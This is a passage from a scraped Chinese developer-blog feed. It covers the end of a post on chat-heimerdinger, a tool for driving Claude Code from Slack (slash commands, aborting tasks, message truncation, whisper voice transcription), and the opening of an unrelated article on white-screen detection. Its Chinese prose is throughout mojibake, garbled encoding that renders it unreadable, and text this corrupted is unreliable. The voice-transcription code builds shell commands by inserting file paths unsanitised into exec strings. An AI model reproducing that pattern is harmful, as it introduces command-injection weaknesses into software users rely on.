<p>ç”¨æˆ·ç‚¹å‡»æŒ‰é’®åï¼Œæˆ‘å†ç”¨æ›´é«˜æƒé™é‡æ–°æ‰§è¡Œè¯·æ±‚ã€‚</p>
<h4 data-id="heading-12">5. Slack æ–œæ å‘½ä»¤</h4>
<p>å…‰å‘æ¶ˆæ¯è¿˜ä¸å¤Ÿï¼Œæˆ‘è¿˜æƒ³è¦ä¸€äº›å¿«æ·æ“ä½œã€‚Slack çš„æ–œæ å‘½ä»¤ï¼ˆSlash Commandsï¼‰æ­£å¥½æ´¾ä¸Šç”¨åœºï¼š</p>
<ul>
<li><code>/project</code> â€”â€” åˆ‡æ¢é¡¹ç›®</li>
<li><code>/stop</code> â€”â€” åœæ­¢å½“å‰æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡</li>
<li><code>/clear</code> â€”â€” æ¸…é™¤ä¼šè¯ï¼Œé‡æ–°å¼€å§‹</li>
</ul>
<p>å®ç°åˆ†ä¸¤å±‚ï¼š</p>
<p><strong>ç¬¬ä¸€å±‚ï¼šSlack Adapter æ³¨å†Œå‘½ä»¤</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ³¨å†Œ /project å‘½ä»¤</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">app</span>.<span class="hljs-title function_">command</span>(<span class="hljs-string">'/project'</span>, <span class="hljs-keyword">async</span> ({ command, ack }) =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">ack</span>();  <span class="hljs-comment">// å¿…é¡»åœ¨ 3 ç§’å†…å“åº”ï¼Œå¦åˆ™ Slack ä¼šæŠ¥é”™</span>

  <span class="hljs-keyword">const</span> context = {
    <span class="hljs-attr">channelId</span>: command.<span class="hljs-property">channel_id</span>,
    <span class="hljs-attr">userId</span>: command.<span class="hljs-property">user_id</span>,
  };

  <span class="hljs-comment">// è§¦å‘äº¤äº’å¤„ç†</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> handler <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">interactionHandlers</span>) {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">handler</span>(<span class="hljs-string">'show_project_selector'</span>, <span class="hljs-string">''</span>, context);
  }
});
</code></pre>
<p><strong>ç¬¬äºŒå±‚ï¼šMessage Processor å¤„ç†äº¤äº’</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">handleInteraction</span>(<span class="hljs-params">action: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span>, context: MessageContext</span>) {
  <span class="hljs-keyword">if</span> (action === <span class="hljs-string">'show_project_selector'</span>) {
    <span class="hljs-comment">// å±•ç¤ºé¡¹ç›®é€‰æ‹©å¡ç‰‡</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showProjectSelector</span>(adapter, context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (action === <span class="hljs-string">'stop_execution'</span>) {
    <span class="hljs-comment">// åœæ­¢å½“å‰ä»»åŠ¡</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleStopExecution</span>(adapter, context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (action === <span class="hljs-string">'clear_session'</span>) {
    <span class="hljs-comment">// æ¸…é™¤ä¼šè¯</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleClearSession</span>(adapter, context);
  }
}
</code></pre>
<p><code>/stop</code> çš„å®ç°æœ‰ç‚¹æ„æ€ â€”â€” éœ€è¦èƒ½å¤Ÿä¸­æ–­æ­£åœ¨è¿è¡Œçš„ Claude è¿›ç¨‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">handleStopExecution</span>(<span class="hljs-params">adapter: IMAdapter, context: MessageContext</span>) {
  <span class="hljs-keyword">const</span> execution = <span class="hljs-variable language_">this</span>.<span class="hljs-property">activeExecutions</span>.<span class="hljs-title function_">get</span>(context.<span class="hljs-property">channelId</span>);

  <span class="hljs-keyword">if</span> (!execution) {
    <span class="hljs-keyword">await</span> adapter.<span class="hljs-title function_">sendMessage</span>(context.<span class="hljs-property">channelId</span>, <span class="hljs-string">'æ²¡æœ‰æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡ã€‚'</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// æ ‡è®°ä¸ºå·²ä¸­æ­¢ï¼Œé˜²æ­¢åç»­æ¶ˆæ¯æ›´æ–°</span>
  execution.<span class="hljs-property">aborted</span> = <span class="hljs-literal">true</span>;
  <span class="hljs-comment">// è§¦å‘ AbortController</span>
  execution.<span class="hljs-title function_">abort</span>();

  <span class="hljs-keyword">await</span> adapter.<span class="hljs-title function_">updateMessage</span>(context.<span class="hljs-property">channelId</span>, execution.<span class="hljs-property">messageTs</span>, <span class="hljs-string">'ğŸ›‘ å·²åœæ­¢'</span>);
}
</code></pre>
<p>è¿™é‡Œç”¨äº† <code>AbortController</code>ï¼Œå®ƒæ˜¯ Node.js åŸç”Ÿæ”¯æŒçš„ä¸­æ­¢ä¿¡å·æœºåˆ¶ã€‚åœ¨å¯åŠ¨ Claude è¿›ç¨‹æ—¶ä¼ å…¥ <code>abortSignal</code>ï¼Œè°ƒç”¨ <code>abort()</code> å°±èƒ½ä¼˜é›…åœ°ç»ˆæ­¢è¿›ç¨‹ã€‚</p>
<p><strong>ä¸€ä¸ªå°ç»†èŠ‚</strong>ï¼šSlack è¦æ±‚æ–œæ å‘½ä»¤å¿…é¡»åœ¨ 3 ç§’å†…å“åº”ï¼ˆ<code>ack()</code>ï¼‰ï¼Œå¦åˆ™ä¼šæ˜¾ç¤ºé”™è¯¯ã€‚æ‰€ä»¥æˆ‘å…ˆ <code>ack()</code>ï¼Œå†å¼‚æ­¥å¤„ç†å®é™…é€»è¾‘ã€‚è¿™æ ·ç”¨æˆ·ä½“éªŒä¼šå¥½å¾ˆå¤šã€‚</p>
<h3 data-id="heading-13">ğŸ˜± è¸©å‘å®å½•ï¼šé‚£äº›è®©æˆ‘å¤´ç§ƒçš„é—®é¢˜</h3>
<h4 data-id="heading-14">å‘ 1ï¼šBun + Slack WebSocket = ğŸ’¥</h4>
<p>æˆ‘ä¸€å¼€å§‹ç”¨ Bun æ¥å¼€å‘ï¼Œbuild ä¹Ÿç”¨ Bunã€‚ç»“æœå‘ç°ä¸€ä¸ªè¯¡å¼‚çš„é—®é¢˜ï¼šSlack çš„ Socket Mode åœ¨ Bun è¿è¡Œæ—¶ä¸‹ç»å¸¸æ–­è¿ã€‚</p>
<p>æ’æŸ¥äº†åŠå¤©ï¼Œå‘ç°æ˜¯ Bun çš„ WebSocket å®ç°å’Œ <code>@slack/bolt</code> ä¸å¤ªå…¼å®¹ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šå¼€å‘æ—¶ç”¨ <code>tsx</code>ï¼ˆNode.js è¿è¡Œæ—¶ï¼‰ï¼Œç”Ÿäº§æ„å»ºç”¨ Bun æ‰“åŒ…ä½†æ”¹æˆ Node.js çš„ shebangï¼š</p>
<pre><code class="hljs language-bash" lang="bash">bun build ./src/cli.ts --outdir ./dist --target node &amp;&amp; \
sed -i <span class="hljs-string">'1s|#!/usr/bin/env bun|#!/usr/bin/env node|'</span> ./dist/cli.js
</code></pre>
<p>æ˜¯çš„ï¼Œæœ‰ç‚¹ä¸‘é™‹ï¼Œä½†å®ƒèƒ½ç”¨ã€‚</p>
<h4 data-id="heading-15">å‘ 2ï¼šSlack æ¶ˆæ¯é•¿åº¦é™åˆ¶</h4>
<p>Slack å•æ¡æ¶ˆæ¯æœ€å¤§ 40KBï¼ˆå®é™…å»ºè®® 38KB ä»¥å†…ï¼‰ã€‚ä½† Claude æœ‰æ—¶å€™ä¼šè¾“å‡ºå¾ˆé•¿çš„å†…å®¹ï¼Œç‰¹åˆ«æ˜¯å®ƒåœ¨è§£é‡Šä»£ç çš„æ—¶å€™ã€‚</p>
<p>ç›´æ¥æˆªæ–­ï¼Ÿä¸è¡Œï¼Œå¯èƒ½æˆªåˆ°ä¸€åŠæŠŠ markdown æ ¼å¼æåäº†ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šæŒ‰å­—èŠ‚é•¿åº¦æˆªæ–­ï¼Œå¹¶ç¡®ä¿æˆªæ–­ç‚¹ä¸åœ¨å¤šå­—èŠ‚å­—ç¬¦ä¸­é—´ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">truncateToByteLength</span>(<span class="hljs-params">str: <span class="hljs-built_in">string</span>, maxBytes: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">const</span> encoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>();
  <span class="hljs-keyword">const</span> encoded = encoder.<span class="hljs-title function_">encode</span>(str);

  <span class="hljs-keyword">if</span> (encoded.<span class="hljs-property">length</span> &lt;= maxBytes) <span class="hljs-keyword">return</span> str;

  <span class="hljs-comment">// æ‰¾åˆ°åˆé€‚çš„æˆªæ–­ç‚¹</span>
  <span class="hljs-keyword">let</span> truncated = encoded.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, maxBytes);
  <span class="hljs-comment">// ç¡®ä¿ä¸æˆªæ–­ UTF-8 å¤šå­—èŠ‚å­—ç¬¦</span>
  <span class="hljs-keyword">while</span> (truncated.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp; (truncated[truncated.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>] &amp; <span class="hljs-number">0xc0</span>) === <span class="hljs-number">0x80</span>) {
    truncated = truncated.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>);
  }

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoder</span>().<span class="hljs-title function_">decode</span>(truncated) + <span class="hljs-string">'\n\n... (å†…å®¹è¿‡é•¿ï¼Œå·²æˆªæ–­)'</span>;
}
</code></pre>
<h4 data-id="heading-16">å‘ 3ï¼šMarkdown æ ¼å¼è½¬æ¢</h4>
<p>Claude è¾“å‡ºçš„æ˜¯æ ‡å‡† Markdownï¼Œä½† Slack ç”¨çš„æ˜¯è‡ªå·±çš„ <code>mrkdwn</code> æ ¼å¼ã€‚ä¸¤è€…è¯­æ³•ä¸ä¸€æ ·ï¼š</p>

























<table><thead><tr><th>Markdown</th><th>Slack mrkdwn</th></tr></thead><tbody><tr><td><code>**bold**</code></td><td><code>*bold*</code></td></tr><tr><td><code>*italic*</code></td><td><code>_italic_</code></td></tr><tr><td><code>[text](url)</code></td><td><code>&lt;url|text&gt;</code></td></tr><tr><td><code>`code`</code></td><td><code>`code`</code></td></tr></tbody></table>
<p>æˆ‘å†™äº†ä¸ªè½¬æ¢å‡½æ•°ï¼Œå¤„ç†è¿™äº›å·®å¼‚ã€‚ä½†æœ€å‘çš„æ˜¯ä»£ç å— â€”â€” Slack å¯¹ä»£ç å—çš„æ¸²æŸ“å¾ˆå¥‡æ€ªï¼Œè¶…è¿‡ä¸€å®šé•¿åº¦å°±ä¼šå‡ºé—®é¢˜ã€‚</p>
<p><strong>æœ€ç»ˆæ–¹æ¡ˆ</strong>ï¼šé•¿ä»£ç ä¸æ”¾åœ¨æ¶ˆæ¯é‡Œï¼Œè€Œæ˜¯ä¸Šä¼ æˆä»£ç ç‰‡æ®µï¼ˆSnippetï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">if</span> (codeBlock.<span class="hljs-property">length</span> &gt; <span class="hljs-number">2000</span>) {
  <span class="hljs-keyword">await</span> slack.<span class="hljs-property">files</span>.<span class="hljs-title function_">uploadV2</span>({
    <span class="hljs-attr">channel_id</span>: channel,
    <span class="hljs-attr">content</span>: codeBlock,
    <span class="hljs-attr">filename</span>: <span class="hljs-string">'code.txt'</span>,
    <span class="hljs-attr">title</span>: <span class="hljs-string">'Code Output'</span>
  });
}
</code></pre>
<h4 data-id="heading-17">å‘ 4ï¼šè¯­éŸ³æ¶ˆæ¯æ”¯æŒ</h4>
<p>æ—¢ç„¶æ˜¯åœ¨æ‰‹æœºä¸Šç”¨ï¼Œé‚£æ”¯æŒè¯­éŸ³æ¶ˆæ¯å²‚ä¸æ˜¯æ›´æ–¹ä¾¿ï¼Ÿè¯´ä¸€å¥è¯å°±èƒ½è®© Claude å¹²æ´»ã€‚</p>
<p>æˆ‘é›†æˆäº† <code>whisper.cpp</code> åšè¯­éŸ³è½¬æ–‡å­—ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">transcribe</span>(<span class="hljs-params">audioPath: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt; {
  <span class="hljs-comment">// å…ˆç”¨ ffmpeg è½¬æ¢æˆ whisper éœ€è¦çš„æ ¼å¼</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">exec</span>(<span class="hljs-string">`ffmpeg -i <span class="hljs-subst">${audioPath}</span> -ar 16000 -ac 1 -f wav <span class="hljs-subst">${wavPath}</span>`</span>);

  <span class="hljs-comment">// è°ƒç”¨ whisper</span>
  <span class="hljs-keyword">const</span> { stdout } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">exec</span>(<span class="hljs-string">`whisper-cli -m <span class="hljs-subst">${modelPath}</span> -f <span class="hljs-subst">${wavPath}</span>`</span>);
  <span class="hljs-keyword">return</span> stdout.<span class="hljs-title function_">trim</span>();
}
</code></pre>
<p>ä½†è¿™é‡Œåˆæœ‰å‘ï¼šSlack å‘æ¥çš„è¯­éŸ³æ˜¯ <code>.mp4</code> æ ¼å¼ï¼Œéœ€è¦å…ˆä¸‹è½½å†è½¬æ¢ã€‚è€Œä¸” whisper æ¨¡å‹æŒºå¤§çš„ï¼Œç¬¬ä¸€æ¬¡è¿è¡Œè¦ä¸‹è½½...</p>
<h4 data-id="heading-18">å‘ 5ï¼šè¿›ç¨‹ç®¡ç†</h4>
<p>ä½œä¸ºä¸€ä¸ªåå°æœåŠ¡ï¼Œè¿›ç¨‹ç®¡ç†æ˜¯å¿…é¡»çš„ï¼š</p>
<ul>
<li>å¦‚ä½•ä¼˜é›…åœ°å¯åŠ¨/åœæ­¢ï¼Ÿ</li>
<li>å¦‚ä½•æ£€æµ‹æœåŠ¡æ˜¯å¦åœ¨è¿è¡Œï¼Ÿ</li>
<li>å¦‚ä½•å¤„ç†åƒµå°¸è¿›ç¨‹ï¼Ÿ</li>
</ul>
<p>æˆ‘ç”¨ PID æ–‡ä»¶ + ä¿¡å·é‡æ¥ç®¡ç†ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> pid = <span class="hljs-title function_">readPidFile</span>();
  <span class="hljs-keyword">if</span> (!pid) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// å…ˆå°è¯•ä¼˜é›…é€€å‡º</span>
  process.<span class="hljs-title function_">kill</span>(pid, <span class="hljs-string">'SIGTERM'</span>);

  <span class="hljs-comment">// ç­‰å¾… 5 ç§’</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">5000</span>);

  <span class="hljs-comment">// å¦‚æœè¿˜åœ¨è¿è¡Œï¼Œå¼ºåˆ¶æ€æ‰</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isRunning</span>(pid)) {
    process.<span class="hljs-title function_">kill</span>(pid, <span class="hljs-string">'SIGKILL'</span>);
  }
}
</code></pre>
<h3 data-id="heading-19">âœ¨ æœ€ç»ˆæ•ˆæœ</h3>
<p>æŠ˜è…¾äº†ä¸¤å¤©ï¼Œç»ˆäºèƒ½ç”¨äº†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…</span>
npm install -g chat-heimerdinger

<span class="hljs-comment"># åˆå§‹åŒ–é…ç½®</span>
hmdg init

<span class="hljs-comment"># å¯åŠ¨æœåŠ¡</span>
hmdg start
</code></pre>
<p>ç„¶ååœ¨ Slack é‡Œï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9bbf37e25a444669824261a7208d970~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yiu5raC5bGCX-i1ouWkp-Wllg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770197474&amp;x-signature=6LgEiu2tVnnnd%2BhdBn0%2Bn9c4N5c%3D" alt="2db91133029cfc157e7dbbcea5630576.jpg" loading="lazy"/></p>
<p><strong>æˆ–è€…ç›´æ¥å‘è¯­éŸ³</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac7f7df145434743a566bd802a638a7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yiu5raC5bGCX-i1ouWkp-Wllg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770197474&amp;x-signature=ixMQg9iJqc%2FEf3cGoLTtujlh7Zo%3D" alt="cae84620508677ae00533e3fc5d68573.jpg" loading="lazy"/></p>
<p>è¹²åœ¨é©¬æ¡¶ä¸Šï¼ŒåŠ¨åŠ¨æ‰‹æŒ‡ï¼Œä»£ç å°±æ”¹å¥½äº†ã€‚Vibe codingï¼Œæ°¸ä¸æ–­æ¡£ï¼</p>
<p>å¦‚æœä¸ç¡®å®šClaude codeçš„æ”¹åŠ¨æ˜¯å¦æ­£ç¡®ï¼Œæ¯æ¬¡å¯¹è¯çš„threadé‡Œè¿˜æœ‰æœ¬æ¬¡ä¿®æ”¹çš„diff</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65803658919e4b7aac248bfe5cc51f09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yiu5raC5bGCX-i1ouWkp-Wllg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770197474&amp;x-signature=h3YTO9ioCZIu0xzerH%2Fk7UMCPWo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-20">å†™åœ¨æœ€å</h3>
<p><strong>å·¥å…·çš„ä»·å€¼åœ¨äºèŠ‚çœæ—¶é—´ã€‚</strong> è™½ç„¶å¼€å‘è¿™ä¸ªå·¥å…·èŠ±äº†æˆ‘ä¸¤ä¸ªæ•´å¤©ï¼Œä½†ä»¥åæ¯æ¬¡è¹²å‘æ—¶ç»§ç»­ vibe coding çœä¸‹çš„æ—¶é—´ï¼Œè¿Ÿæ—©ä¼šèµšå›æ¥çš„ï¼ˆå¤§æ¦‚ï¼‰ã€‚</p>
<p>slackç›®å‰æ”¯æŒå·²ç»åŸºæœ¬å®Œå–„ï¼Œä½†é£ä¹¦æˆ‘æ˜¯ç›²è°ƒçš„ï¼ˆå…¬å¸å†…ç½‘æœ‰é˜²ç«å¢™ï¼Œè¿ä¸åˆ°é£ä¹¦çš„socketï¼Œæ‰€ä»¥é£ä¹¦çš„ä¸ä¿è¯å¯ç”¨ï¼Œåç»­æˆ‘è¿˜ä¼šç»§ç»­è°ƒæ•´ï¼‰ã€‚åç»­æˆ‘è¿˜ä¼šè€ƒè™‘æ”¯æŒä¸Šé’‰é’‰ã€ä¼å¾®ã€å¾®ä¿¡ï¼Œ<strong>è®©æ›´å¤šçš„IMå·¥å…·éƒ½èƒ½å®ç°é©¬æ¡¶vibe coding</strong>ã€‚</p>
<hr/>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fa1245582339%2Fchat-heimerdinger" target="_blank" title="https://github.com/a1245582339/chat-heimerdinger" ref="nofollow noopener noreferrer">GitHub - chat-heimerdinger</a></p>
<p>å¦‚æœè§‰å¾—æœ‰ç”¨ï¼Œæ¬¢è¿ Star â­</p>
<p>æœ‰é—®é¢˜æ¬¢è¿è¯„è®ºåŒºäº¤æµï¼Œæˆ‘ä¼šå°½é‡å›å¤ï¼ˆå¦‚æœæˆ‘ä¸æ˜¯åœ¨å•æ‰€é‡ŒæŒ‡æŒ¥ Claude å¹²æ´»çš„è¯ï¼‰ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®Œæ•´çš„ç™½å±æ£€æµ‹ SDK]]></title>    <link>https://juejin.cn/post/7599933828544036927</link>    <guid>https://juejin.cn/post/7599933828544036927</guid>    <pubDate>2026-01-28T03:32:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7599933828544036927" data-draft-id="7599983917664108587" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®Œæ•´çš„ç™½å±æ£€æµ‹ SDK "/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-28T03:32:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°å°å°å°å®‡"/> <meta itemprop="url" content="https://juejin.cn/user/3386151546662077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®Œæ•´çš„ç™½å±æ£€æµ‹ SDK 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3386151546662077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°å°å°å°å®‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T03:32:54.000Z" title="Wed Jan 28 2026 03:32:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    34
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰ç«¯ç™½å±æ£€æµ‹å®Œæ•´æ–¹æ¡ˆ</h2>
<p>ç™½å±æ£€æµ‹æ˜¯å‰ç«¯ç›‘æ§ä½“ç³»ä¸­éå¸¸é‡è¦çš„ä¸€ç¯ï¼Œç”¨äºæ£€æµ‹é¡µé¢æ˜¯å¦æ­£å¸¸æ¸²æŸ“ï¼ŒåŠæ—¶å‘ç°å¹¶ä¸ŠæŠ¥ç™½å±å¼‚å¸¸ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€ç™½å±æ£€æµ‹çš„æ ¸å¿ƒåŸç†</h3>
<p>ç™½å±æ£€æµ‹ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§å®ç°æ€è·¯ï¼š</p>
<ol>
<li><strong>é‡‡æ ·ç‚¹æ£€æµ‹æ³•</strong> - åœ¨é¡µé¢å…³é”®ä½ç½®é‡‡æ ·ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰æœ‰æ•ˆå†…å®¹</li>
<li><strong>DOM å…ƒç´ æ£€æµ‹æ³•</strong> - æ£€æµ‹é¡µé¢å…³é”® DOM å…ƒç´ æ˜¯å¦å­˜åœ¨</li>
<li><strong>MutationObserver ç›‘å¬æ³•</strong> - ç›‘å¬ DOM å˜åŒ–åˆ¤æ–­é¡µé¢æ¸²æŸ“çŠ¶æ€</li>
